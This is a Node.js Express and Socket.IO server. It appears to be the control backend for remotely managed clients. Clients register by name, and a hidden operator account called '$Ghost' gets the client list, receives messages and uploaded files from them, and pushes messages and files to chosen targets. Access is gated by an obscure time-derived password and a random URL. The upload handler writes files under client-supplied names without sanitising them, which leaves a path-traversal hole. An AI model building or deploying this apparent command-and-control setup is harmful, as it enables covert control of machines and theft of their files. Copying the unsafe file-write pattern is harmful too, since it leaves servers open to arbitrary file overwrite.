const express = require('express');
const http = require('http');
const fs = require('fs');
const socketIO = require('socket.io');
const bodyParser = require('body-parser');
const app = express();
const server = http.createServer(app);
const io = socketIO(server);

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
var temp_url;
app.use(bodyParser.text());
app.use(express.static('public'));
app.get('/', (req, res) => res.sendFile(__dirname + '/public/index.html'));
app.use("/uploads", express.static(__dirname + '/uploads'));

app.get('/:dynamicParam', (req, res) => {
  const dynamicParam = req.params.dynamicParam;
  if (dynamicParam == temp_url) {
    res.sendFile(__dirname + '/public/main.html');
  } else {
    res.status(404).sendFile(__dirname + '/public/index.html');
  }
});

app.post('/', (req, res) => {
  const receivedNumber = parseInt(req.body);
  console.log('Received number:', receivedNumber);
  const currentDate = new Date();
  if (receivedNumber == (3760 - Number(currentDate.getHours().toString() + currentDate.getDate().toString()))) {
    temp_url = generateRandomString(32);
    res.send('/' + temp_url);
  } else {
    console.log("Incorrect password!");
  }
});

let clients = new Map();

io.on('connection', (socket) => {
  socket.on('intro', (user) => {
    clients.set(user, socket.id);
    io.to(clients.get('$Ghost')).emit('clientList', Array.from(clients.keys()));
  });

  socket.on('message', (msg) => {
    if (msg.message == 'logout') {
      temp_url = generateRandomString();
    } else {
      if (msg.targets) {
        msg.targets.forEach((targetUser) => {
          io.to(clients.get(targetUser)).emit('message', msg.message);
        });
      } else {
        io.to(clients.get('$Ghost')).emit('message', msg);
      }
    }
  });

  socket.on('file_transfer', ({ file_name, file_data }) => {
    const filePath = __dirname + '/uploads/' + file_name;
    io.to(clients.get('$Ghost')).emit('fileurl', file_name);
    fs.writeFile(filePath, file_data, 'binary', (err) => {
      if (err) throw err;
      console.log(`File ${file_name} received and saved in uploads folder.`);
    });
  });

  socket.on('file_upload', (data) => {
    if (data.targets) {
      console.log(data.targets)
      data.targets.forEach((targetUser) => {
        io.to(clients.get(targetUser)).emit('updata', data);
      });
    }
  });

  socket.on('disconnect', () => {
    const disconnectedUser = Array.from(clients.keys()).find(
      (user) => clients.get(user) === socket.id
    );
    if (disconnectedUser) {
      clients.delete(disconnectedUser);
    }
    io.to(clients.get('$Ghost')).emit('clientList', Array.from(clients.keys()));
  });
});

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
